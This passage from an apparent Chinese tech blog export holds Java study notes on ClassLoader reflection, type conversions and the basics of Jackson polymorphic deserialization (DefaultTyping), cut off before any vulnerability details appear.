<p>注意一点，forName()方法会执行目标class的static代码块方法。</p>
<p>loadClass 应该在URLClassLoader里面用的多，这个涉及到动态加载jar包。</p>
<p>获取当前ClassLoader的四种方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure>



<h2 id="通过反射获取defineClass方法"><a href="#通过反射获取defineClass方法" class="headerlink" title="通过反射获取defineClass方法"></a>通过反射获取defineClass方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader.defineClass(buye[] b);</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">1. java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]&#123;byte[].class, int.class, int.class&#125;);</span><br><span class="line"><span class="number">2</span>. defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="number">3</span>. Class cc = (Class) defineClassMethod.invoke(<span class="keyword">new</span> ClassLoader()&#123;&#125;, classBytes, <span class="number">0</span>, classBytes.length);</span><br></pre></td></tr></table></figure>



<h2 id="通过反射结合Thread"><a href="#通过反射结合Thread" class="headerlink" title="通过反射结合Thread"></a>通过反射结合Thread</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ...</span><br><span class="line"><span class="number">2</span>. ...</span><br><span class="line"><span class="number">3</span>. Class cc = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), classBytes, <span class="number">0</span>, classBytes.length);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>ClassLoader</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据类型转换</title>
    <url>/Java%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>锲而不舍，金石可镂。</p>
</blockquote>
<p>今天来梳理Java数据类型转换，这部分很杂乱，顺便总结总结API，做个笔记。</p>
<a id="more"></a>

<h1 id="类型种类"><a href="#类型种类" class="headerlink" title="类型种类"></a>类型种类</h1><p>Java提供了两个类型系统，<strong>基本类型</strong>与<strong>引用类型</strong>，使用基本类型在于效率，然而很多情况，会创建对象使用，因为对象可以做更多的功能。</p>
<p>如果想要我们的基本类型像对象一样操作，就可以使用基本类型对应的包装类，如下：</p>
<table>
<thead>
<tr>
<th>基本类型</th>
<th>对应的包装类（位于java.lang包中）</th>
</tr>
</thead>
<tbody><tr>
<td>byte</td>
<td>Byte</td>
</tr>
<tr>
<td>short</td>
<td>Short</td>
</tr>
<tr>
<td>int</td>
<td><strong>Integer</strong></td>
</tr>
<tr>
<td>long</td>
<td>Long</td>
</tr>
<tr>
<td>float</td>
<td>Float</td>
</tr>
<tr>
<td>double</td>
<td>Double</td>
</tr>
<tr>
<td>char</td>
<td><strong>Character</strong></td>
</tr>
<tr>
<td>boolean</td>
<td>Boolean</td>
</tr>
</tbody></table>
<p>经常使用的有4种基本类型：</p>
<ol>
<li>char</li>
<li>byte</li>
<li>String</li>
<li>int(Integer)</li>
</ol>
<p>一下主要讨论这四个类型的转换，会用到包装类。</p>
<h1 id="char-lt-gt-int"><a href="#char-lt-gt-int" class="headerlink" title="char &lt;-&gt; int"></a>char &lt;-&gt; int</h1><p>先看代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">65</span>;</span><br><span class="line">        System.out.println((<span class="keyword">char</span>)i);<span class="comment">//result:A</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span> c = <span class="string">'A'</span>;</span><br><span class="line">        System.out.println((<span class="keyword">int</span>)c);<span class="comment">//result:65</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>可以看到，如果进行强制类型转换，char会和ASCII码进行互相转换。</p>
<h2 id="char-gt-int"><a href="#char-gt-int" class="headerlink" title="char -&gt; int"></a>char -&gt; int</h2><p>现在想要的是 char:’9’ -&gt; int:9</p>
<p><strong>转换代码</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> b = <span class="string">'4'</span>;</span><br><span class="line"><span class="keyword">int</span> numericValue = Character.getNumericValue(b);</span><br><span class="line">System.out.println(numericValue);<span class="comment">// 4 type:int</span></span><br></pre></td></tr></table></figure>



<h2 id="int-gt-char"><a href="#int-gt-char" class="headerlink" title="int -&gt; char"></a>int -&gt; char</h2><p>现在想要的是 int:9 -&gt; char:’9’</p>
<p><strong>转换代码</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a =<span class="number">4</span>;</span><br><span class="line"><span class="keyword">char</span> intValue = Character.forDigit(a,<span class="number">10</span>);</span><br><span class="line">System.out.println(intValue);<span class="comment">// 4 type:char</span></span><br></pre></td></tr></table></figure>



<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>直接将’0‘的ASCII码值加上一起转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c = (<span class="keyword">char</span>)(<span class="string">'0'</span> + i);</span><br></pre></td></tr></table></figure>



<h1 id="int-lt-gt-byte"><a href="#int-lt-gt-byte" class="headerlink" title="int &lt;-&gt; byte"></a>int &lt;-&gt; byte</h1><h2 id="int-gt-byte"><a href="#int-gt-byte" class="headerlink" title="int -&gt; byte"></a>int -&gt; byte</h2><p>会发生高位截断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">234</span>;</span><br><span class="line"><span class="keyword">byte</span> b = (<span class="keyword">byte</span>)a;</span><br><span class="line">System.out.println(b);<span class="comment">//-22</span></span><br></pre></td></tr></table></figure>



<h2 id="byte-gt-int"><a href="#byte-gt-int" class="headerlink" title="byte -&gt; int"></a>byte -&gt; int</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">byteToInt</span><span class="params">(<span class="keyword">byte</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//Java 总是把 byte 当做有符处理；我们可以通过将其和 0xFF 进行二进制与得到它的无符值</span></span><br><span class="line">		<span class="keyword">return</span> b &amp; <span class="number">0xFF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span> b = -<span class="number">22</span>;</span><br><span class="line">System.out.println(byteToInt(b));<span class="comment">//234</span></span><br></pre></td></tr></table></figure>



<h1 id="char-lt-gt-String"><a href="#char-lt-gt-String" class="headerlink" title="char &lt;-&gt; String"></a>char &lt;-&gt; String</h1><p>这类就很常见了。</p>
<h2 id="char-gt-String"><a href="#char-gt-String" class="headerlink" title="char -&gt; String"></a>char -&gt; String</h2><p>直接上API，万物<code>.valueOf()</code>转一切。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> a = <span class="string">'A'</span>;</span><br><span class="line">String s = String.valueOf(a);</span><br><span class="line">System.out.println(s);<span class="comment">//A type:String</span></span><br></pre></td></tr></table></figure>

<p>字符数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>[] c = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>&#125;;</span><br><span class="line">String n = String.valueOf(c);</span><br><span class="line">System.out.println(n);<span class="comment">//ABCDEFG</span></span><br></pre></td></tr></table></figure>



<h2 id="String-gt-char"><a href="#String-gt-char" class="headerlink" title="String -&gt; char"></a>String -&gt; char</h2><p>老熟面孔了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//n = "ABCDEFG"</span></span><br><span class="line"><span class="keyword">char</span>[] chars = n.toCharArray();</span><br><span class="line">System.out.println(Arrays.toString(chars));<span class="comment">//[A, B, C, D, E, F, G]</span></span><br></pre></td></tr></table></figure>



<h1 id="String-lt-gt-byte"><a href="#String-lt-gt-byte" class="headerlink" title="String &lt;-&gt;byte"></a>String &lt;-&gt;byte</h1><p>这里默认就是byte[]字节数组。</p>
<h2 id="String-gt-byte"><a href="#String-gt-byte" class="headerlink" title="String -&gt; byte[]"></a>String -&gt; byte[]</h2><p>直接上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str = <span class="string">"ABCDEFG"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] strbyte = str.getBytes();</span><br><span class="line">System.out.println(Arrays.toString(strbyte));<span class="comment">//[65, 66, 67, 68, 69, 70, 71]</span></span><br></pre></td></tr></table></figure>

<p>可以发现直接内容其实就是ASCII码。</p>
<h2 id="byte-gt-String"><a href="#byte-gt-String" class="headerlink" title="byte[] -&gt; String"></a>byte[] -&gt; String</h2><p>直接用String的构造方法就行，直接上：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] b= &#123;-<span class="number">60</span>,-<span class="number">29</span>,-<span class="number">70</span>,-<span class="number">61</span>,-<span class="number">93</span>,-<span class="number">84</span>,-<span class="number">42</span>,-<span class="number">48</span>,-<span class="number">71</span>,-<span class="number">6</span>,<span class="number">13</span>,<span class="number">10</span>,-<span class="number">42</span>,-<span class="number">48</span>,-<span class="number">71</span>,-<span class="number">6</span>,-<span class="number">93</span>,-<span class="number">84</span>,-<span class="number">60</span>,-<span class="number">29</span>,-<span class="number">70</span>,-<span class="number">61</span>&#125;;</span><br><span class="line">String s = <span class="keyword">new</span> String(b);</span><br><span class="line">System.out.println(s);<span class="comment">//你好，中国，中国，你好</span></span><br></pre></td></tr></table></figure>



<h1 id="int-lt-gt-String"><a href="#int-lt-gt-String" class="headerlink" title="int &lt;-&gt; String"></a>int &lt;-&gt; String</h1><h2 id="int-gt-String"><a href="#int-gt-String" class="headerlink" title="int[] -&gt; String"></a>int[] -&gt; String</h2><p>可以用StringBuilder，直接上：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">int</span>[] test = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; test.length; i++) &#123;</span><br><span class="line">    sb.append(test[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sb.toString());<span class="comment">//122345</span></span><br></pre></td></tr></table></figure>



<p>要是想转换为ASCII码对应的字符串，可以这么写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">int</span>[] test = &#123;<span class="number">65</span>,<span class="number">66</span>,<span class="number">67</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; test.length; i++) &#123;</span><br><span class="line">    sb.append((<span class="keyword">char</span>)test[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sb.toString());<span class="comment">//ABC</span></span><br></pre></td></tr></table></figure>



<h2 id="String-gt-int"><a href="#String-gt-int" class="headerlink" title="String -&gt; int[]"></a>String -&gt; int[]</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String ss = <span class="string">"12345678"</span>;</span><br><span class="line"><span class="keyword">char</span>[] cc = ss.toCharArray();</span><br><span class="line"><span class="keyword">int</span>[] tar = <span class="keyword">new</span> <span class="keyword">int</span>[ss.length()];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cc.length; i++) &#123;</span><br><span class="line">    tar[i] = Integer.parseInt(String.valueOf(cc[i]))；</span><br><span class="line">    <span class="comment">//Interger.valueOf(cc[i].toString(),2)也可以。</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Arrays.toString(tar));<span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure>



<h1 id="byte-lt-gt-char"><a href="#byte-lt-gt-char" class="headerlink" title="byte&lt;-&gt;char"></a>byte&lt;-&gt;char</h1><h2 id="char-gt-byte"><a href="#char-gt-byte" class="headerlink" title="char[] -&gt; byte[]"></a>char[] -&gt; byte[]</h2><p>方法1:用String作为跳板</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>[] cs = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span> &#125;;</span><br><span class="line">String scs = <span class="keyword">new</span> String(cs);</span><br><span class="line"><span class="keyword">byte</span>[] bb= scs.getBytes();</span><br><span class="line">System.out.println(Arrays.toString(bb));<span class="comment">//[97, 98, 99, 100, 101, 102, 103]</span></span><br></pre></td></tr></table></figure>

<p>方法2:循环+强制转型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>[] cs = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span> &#125;;</span><br><span class="line"><span class="keyword">byte</span>[] bs2 = <span class="keyword">new</span> <span class="keyword">byte</span>[cs.length];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cs.length; i++) &#123;<span class="comment">//循环将char数组的每一个元素转换为byte并存在上面定义的byte数组中</span></span><br><span class="line">		bs2[i] = (<span class="keyword">byte</span>) cs[i];<span class="comment">//将每一个char转换成byte</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Arrays.toString(bs2));<span class="comment">//[97, 98, 99, 100, 101, 102, 103]</span></span><br></pre></td></tr></table></figure>



<h2 id="byte-gt-char"><a href="#byte-gt-char" class="headerlink" title="byte[] -&gt; char[]"></a>byte[] -&gt; char[]</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">char</span>[] getChars (<span class="keyword">byte</span>[] bytes) &#123;</span><br><span class="line">	Charset cs = Charset.forName (<span class="string">"UTF-8"</span>);</span><br><span class="line">	ByteBuffer bb = ByteBuffer.allocate (bytes.length);</span><br><span class="line">  bb.put (bytes);</span><br><span class="line">  bb.flip ();</span><br><span class="line">  CharBuffer cb = cs.decode (bb);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> cb.array();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">byte</span>[] bb = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>[] result = getChars(bb);</span><br><span class="line">System.out.println(Arrays.toString(result));<span class="comment">//[a, b, c, d, e, f, g]</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>【反序列化漏洞】Jackson</title>
    <url>/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>往事依稀浑似梦，都随风雨到心头。</p>
</blockquote>
<p>今天来分析Jackson。</p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p>
<h1 id="序列化操作"><a href="#序列化操作" class="headerlink" title="序列化操作"></a>序列化操作</h1><p>在jackson内部，需要进行序列化的函数是：</p>
<p>提供了<code>ObjectMapper.writeValueAsString()</code>和<code>ObjectMapper.readValue()</code>两个方法来实现序列化和反序列化的功能。</p>
<ul>
<li><code>ObjectMapper.writeValueAsString()</code>———序列化</li>
<li><code>ObjectMapper.readValue()</code>————————反序列化</li>
</ul>
<p><code>pom.xml</code>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>来个小Demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">"0range"</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String json=mapper.writeValueAsString(stu);</span><br><span class="line">            System.out.println(json);</span><br><span class="line">            <span class="comment">//&#123;"age":20,"name":"0range"&#125;</span></span><br><span class="line">            Student stu1 = mapper.readValue(json,Student<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            System.out.println(stu1);</span><br><span class="line">            <span class="comment">//&#123;"age":20,"name":"0range"&#125;</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s"</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916095322927.png" alt="image-20200916095322927"></p>
<h1 id="JacksonPolymorphicDeserialization"><a href="#JacksonPolymorphicDeserialization" class="headerlink" title="JacksonPolymorphicDeserialization"></a>JacksonPolymorphicDeserialization</h1><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p>
<p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p>
<p><strong>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化</strong>：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p>
<p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种:</p>
<ul>
<li>DefaultTyping</li>
<li>@JsonTypeInfo注解。</li>
</ul>
<p>下面具体看一下。</p>
<h2 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h2><p><code>com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping</code></p>
<p>Jackson提供一个enableDefaultTyping设置，其包含4个值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> DefaultTyping &#123;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * This value means that only properties that have</span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including</span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default</span></span><br><span class="line"><span class="comment">        * typing.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       JAVA_LANG_OBJECT,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;</span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).</span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       OBJECT_AND_NON_CONCRETE,</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span></span><br><span class="line"><span class="comment">        * plus all array types for them.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of</span></span><br><span class="line"><span class="comment">        * "natural" types (String, Boolean, Integer, Double), which</span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for</span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_FINAL</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916101121217.png" alt="image-20200916101121217"></p>
<h3 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h3><p>当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）。</p>
<p>举个例子，给 <strong>People</strong> 里添加一个 <strong>Object object</strong> 的属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People people = <span class="keyword">new</span> People();</span><br><span class="line">        people.name=<span class="string">"0range"</span>;</span><br><span class="line">        people.age =<span class="number">18</span>;</span><br><span class="line">        people.object= <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">      	mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">      </span><br><span class="line">        String json = objectMapper.writeValueAsString(people);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        People readpeople = objectMapper.readValue(json, People<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(readpeople);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看看结果：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916111202378.png" alt="image-20200916111202378"></p>
<p>也就是说，在反序列化的时候，会将类中的夹带的其他类跟着一起还原出来。</p>
<h3 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h3><p>当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）。</p>
<p>此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p>
<p>看看下面这个：</p>
